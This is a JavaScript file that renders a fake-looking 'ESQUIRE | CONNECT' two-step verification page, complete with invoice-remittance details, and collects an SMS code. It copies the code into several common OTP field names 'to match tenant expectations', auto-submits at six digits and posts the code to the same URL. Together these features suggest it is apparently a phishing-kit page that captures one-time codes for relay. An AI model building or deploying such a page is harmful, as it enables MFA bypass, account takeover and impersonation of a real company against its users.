// mfa-sms.js — Self-rendered MFA SMS Challenge (Advanced mode, default head tags OFF)
// Renders your two-column shell + a code input. Posts as application/x-www-form-urlencoded
// to the SAME URL, with multiple common field names to match tenant expectations.

const html = String.raw;

function renderShell() {
  const node = document.createElement('div');
  node.innerHTML = html`
    <div class="topbar"><div class="brand">ESQUIRE | CONNECT</div></div>
    <main class="wrap">
      <section class="left">
        <h1>Two-Step Verification</h1>
        <p class="lead">For your security, please enter the code we sent via SMS.</p>

        <div class="bullets">
          <div><b>Protect your account.</b> A second step keeps your data safer.</div>
          <div><b>Quick and simple.</b> Enter the 6-digit code to continue.</div>
          <div><b>Need help?</b> Contact support to recover access.</div>
        </div>

        <div class="remit">
          <b>Invoice Remittance Information</b><br/>
          Esquire Deposition Solutions, LLC<br/>
          P.O. Box 846099<br/>
          Dallas, TX 75284-6099
        </div>
      </section>

      <aside class="panel">
        <h2>Verify</h2>

        <!-- Standard urlencoded POST to same URL -->
        <form id="mfa-form" method="post" accept-charset="utf-8" autocomplete="one-time-code" novalidate>
          <div style="margin:8px 0 16px;">
            <label for="code" style="display:block;margin-bottom:6px;font-weight:600">Verification code</label>
            <input id="code" inputmode="numeric" pattern="[0-9]*" maxlength="8"
                   placeholder="Enter 6-digit code"
                   style="width:100%;padding:10px 12px;border:1px solid #d5dee8;border-radius:6px">
          </div>

          <!-- Hidden fields with multiple common names -->
          <input type="hidden" name="otp" value="">
          <input type="hidden" name="code" value="">
          <input type="hidden" name="passcode" value="">
          <input type="hidden" name="verification_code" value="">

          <button type="submit"
                  style="padding:10px 14px;border-radius:6px;border:1px solid #0a69b5;background:#0a69b5;color:#fff;font-weight:600;cursor:pointer">
            Verify
          </button>
        </form>

        <div id="error" class="note" style="display:none;margin-top:12px;color:#b42318"></div>

        <div class="note" style="margin-top:14px">
          Didn’t get a code? Wait a moment and check your signal. (Resend may be handled by your app’s flow.)
        </div>
      </aside>
    </main>
  `;
  document.body.prepend(...Array.from(node.childNodes));
}

function wireUp() {
  const form = document.getElementById('mfa-form');
  const visible = document.getElementById('code');
  const errorEl = document.getElementById('error');
  const mirrors = Array.from(form.querySelectorAll('input[type="hidden"]'));

  // Autofocus + keep only digits
  visible.focus();
  const setMirrors = (v) => mirrors.forEach(h => (h.value = v));

  const sanitize = (s) => (s || "").replace(/\D+/g, "").slice(0, 8);

  visible.addEventListener('input', () => {
    const v = sanitize(visible.value);
    visible.value = v;
    setMirrors(v);
    // Auto-submit on 6 digits (common OTP length)
    if (v.length === 6) form.requestSubmit();
  });

  visible.addEventListener('paste', (e) => {
    e.preventDefault();
    const pasted = (e.clipboardData || window.clipboardData).getData('text');
    const v = sanitize(pasted);
    visible.value = v; setMirrors(v);
    if (v.length === 6) form.requestSubmit();
  });

  // Let the browser do a normal urlencoded POST to same URL
  form.addEventListener('submit', () => { errorEl.style.display = 'none'; });
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => { renderShell(); wireUp(); });
} else {
  renderShell(); wireUp();
}
